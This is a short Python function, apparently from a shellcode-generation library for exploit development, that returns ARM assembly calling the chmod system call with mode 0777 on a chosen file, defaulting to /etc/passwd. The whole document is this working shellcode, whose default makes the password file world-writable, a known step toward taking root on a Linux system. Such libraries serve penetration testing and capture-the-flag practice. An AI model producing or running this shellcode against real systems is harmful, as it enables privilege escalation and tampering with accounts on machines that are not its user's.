def generate(fname='/etc/passwd'):
    """``chmod`` like a UNIX command with mask ``0777``

    Args:
        fname(str): file name
    """
    sc = """
    adr r0, chmod_1
    movw r1, #511
    mov r7, #15
    svc 0
    b after_1
chmod_1:
    .asciz "%s\x00"
    .align 2
after_1:
    """ % (fname)
    return sc
